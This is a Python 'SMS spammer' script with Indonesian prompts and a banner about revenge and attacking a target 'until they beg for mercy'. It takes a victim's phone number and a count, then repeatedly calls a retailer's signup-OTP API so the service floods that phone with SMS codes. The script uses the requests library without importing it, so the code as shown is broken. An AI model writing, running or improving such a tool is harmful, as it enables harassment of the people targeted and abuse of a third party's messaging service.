#!/bin/python

# import module
import os
import sys
import time

# mengetik otomatis
def mengetik(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)
        
# isi utama
os.system("clear")
print('+===============================================+')
print('{+} Author   : Danendra')
print('{+} Cyber Id : PicoXploit')
print('{+} Slogan   : Destroy , Destroy , Destroy')
print('+===============================================+')
mengetik("PICO SMS SPAMMER")
mengetik("Serang Target Sampai Minta Ampun!")
mengetik("maked with \U0001F49A by : ~pico ")

kabar = input('mau bales dendam brow? [iya nih/aduh engga deh masih kasian]:   ')


if (kabar == "iya nih"):
    print ("okee brow script siap meluncur!")

elif (kabar == "aduh engga deh masih kasian"):
    mengetik ("iye bener juga , banyakin istigfar brow biar gak dendaman :)")
    mengetik("tapi kalo mau bales dendam , monggo dipake wkwkwkwkwk")
    mengetik("loading exit system ...")
    mengetik("script akan ketutup , dadah~")
    sys.exit(1)


print("loading script:")

#animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

for i in range(len(animation)):
    time.sleep(0.5)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()

print('Done!')

no = int(input('masukan no target nya brow : '))
jum = int(input('masukan jumlah pesan : '))

json = {'phone' :no}
jumlahpes = 0
for res in range(jum):
    res = requests.post('https://cmsapi.mapclub.com/api/signup-otp' , json=json)
    if "ok" in res.text :
        jumlahpes +=1
        print(jumlahpes, 'berhasil terhantam brow')        
    else:       
        print('error brow , coba lagi deh ===> ', res.text)




